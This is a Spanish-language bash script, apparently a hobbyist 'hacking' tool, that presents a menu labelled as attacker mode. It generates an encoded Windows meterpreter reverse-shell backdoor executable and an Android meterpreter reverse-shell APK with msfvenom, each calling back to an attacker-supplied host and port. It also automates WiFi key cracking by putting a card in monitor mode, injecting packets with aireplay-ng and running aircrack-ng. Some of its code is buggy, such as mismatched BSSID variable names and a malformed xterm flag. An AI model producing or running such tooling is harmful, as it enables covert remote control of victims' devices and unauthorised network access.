#!/bin/bash

ROJO=$(tput setaf 1)
VERDE=$(tput setaf 9)
AZUL=$(tput setaf 4)
echo "    ▄▄▄       ██▓     ██▓███   ██░ ██  ▄▄▄       "
echo "    ▒████▄    ▓██▒    ▓██░  ██▒▓██░ ██▒▒████▄    "
echo "    ▒██  ▀█▄  ▒██░    ▓██░ ██▓▒▒██▀▀██░▒██  ▀█▄  "
echo "    ░██▄▄▄▄██ ▒██░    ▒██▄█▓▒ ▒░▓█ ░██ ░██▄▄▄▄██ "
echo "     ▓█   ▓██▒░██████▒▒██▒ ░  ░░▓█▒░██▓ ▓█   ▓██▒"
echo "     ▒▒   ▓▒█░░ ▒░▓  ░▒▓▒░ ░  ░ ▒ ░░▒░▒ ▒▒   ▓▒█░"
echo "      ▒   ▒▒ ░░ ░ ▒  ░░▒ ░      ▒ ░▒░ ░  ▒   ▒▒  "
echo "      ░   ▒     ░ ░   ░░        ░  ░░ ░  ░   ▒   "
echo "          ░  ░    ░  ░          ░  ░  ░      ░   "
echo 
echo "_________________________________________________"
echo "|                                               |"
echo "|                                               |"
echo "|         Alpha - Encrypt Security / V1.0       |"
echo "|                                               |"
echo "|             Facebook: @H4CK3RD4RK             |"
echo "|             YouTube:  MrH4CK3R_D4RK           |"  
echo "|                                               |"
echo "|_______________________________________________|"
echo
echo $ROJO
echo "|           M O D O - A T A C A N T E           |"
echo $VERDE
echo "|          1 Crear Backdoor para Windows        |"
echo "|          2 Crear Backdoor para Android        |"               
echo "|          3 Crackear Red WiFi                  |"
echo "|_______________________________________________|"
echo
echo "    Dependiendo de la opcion escriba 1 , 2 o 3    "
echo "  - - - - - - - - - - - - - - - - - - - - - - - - "
read opcion 
 
case $opcion in
1) echo "              Ponga su LHOST"
   echo "- - - - - - - - - - - - - - - - - - - - - - - - "
   read LHOST
   echo "              Ponga su LPORT"
   echo "- - - - - - - - - - - - - - - - - - - - - - - - "
   read LPORT
   echo "       Cargando Backdoor Para Windows...        "
   echo "- - - - - - - - - - - - - - - - - - - - - - - - "
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -e x86/shikata_ga_nai -i 10 -f exe > /root/Desktop/prueba.exe
   echo
   echo "   Creado con exito en la ruta /root/Desktop     "
   echo "- - - - - - - - - - - - - - - - - - - - - - - - "
   esac
   case $opcion in
2) echo "              Ponga su LHOST"
   echo "- - - - - - - - - - - - - - - - - - - - - - - - "
   read LHOST
   echo "              Ponga su LPORT"
   echo "- - - - - - - - - - - - - - - - - - - - - - - - "
   read LPORT
   echo "       Cargando Backdoor para Android...        "
   echo "- - - - - - - - - - - - - - - - - - - - - - - - "
   msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT > /root/Desktop/prueba.apk
   echo
   echo "   Creado con exito en la ruta /root/Desktop     "
   echo "- - - - - - - - - - - - - - - - - - - - - - - -  "
   esac
   case $opcion in 
3) ROJO=$(tput setaf 1)
   VERDE=$(tput setaf 2)
   echo $VERDE
   iwconfig | awk '(NR == 1)  { print "Tu interfaz de red inalambrica es:" $1 }'
   echo  -e "\n"
   echo "Escribe el nombre de la tarjeta de red  de la cual vas a crear una interface en modo monitor"
   echo $ROJO
   read tarjeta
   airmon-ng start $tarjeta
   sleep 2
   clear
   iwconfig | grep mon 
   
  echo $VERDE
  echo "Escribe el nombre de la interface que esta en modo monitor"
  echo $ROJO
  read monitor
  
  xterm -bg black -fg green -geometry 157-37+1+0 -T "Redes WiFI Disponibles" -e  airodump-ng $monitor &
  
  echo $VERDE
  echo "Pon el nombre del archivo donde se van a guardar los datos capturados"
  echo $ROJO
  read nombre
  echo $VERDE
  echo "Escriba el numero de canal de la red WiFi que vas a realizar la auditoria"
  echo $ROJO 
  read canal
  echo $VERDE 
  echo "Escribe el BSSID de la Red WiFI que va a realizar la auditoria"
  echo "ROJO"
  read BSSID

  xterm bg black -fg green -geometry 157-37+1+0 -T "Crackeando la Red WiFI" -e airodump-ng -w $nombre -c $canal --bssid $bssid --ignore-negative-one $monitor &
  sleep 2
  
  xterm bg black -fg green -geometry 157-37+1+0 -T "Autentificando" -e aireplay-ng -1 0 -a $bssid --ignore-negative-one $monitor &
  sleep 2
  
  xterm bg black -fg green -geometry 157-37+1+0 -T "Inyectando Paquetes" -e aireplay-ng -3 -b $bssid --ignore-negative-one $monitor &
  sleep 2

  echo $VERDE
  echo "Para obtener la clave de la Red WiFi necesitas tener mas de 20.000 de la columna data, en el caso de que hayas conseguido mas de 20.000 data escribe el numero 1 y pulse enter"
  until [ $respuesta = 1 ];do
  echo "1) Ya tengo mas de 20.000 data"
  echo "2) TOdavia no tengo 20.000 data"
  echo -n "#?"
  read respuesta 
  done 
  
  aircrack-ng $nombre*.cap
  sleep 2
  airmon-ng stop $monitor
  sleep 2 
  exit 
esac
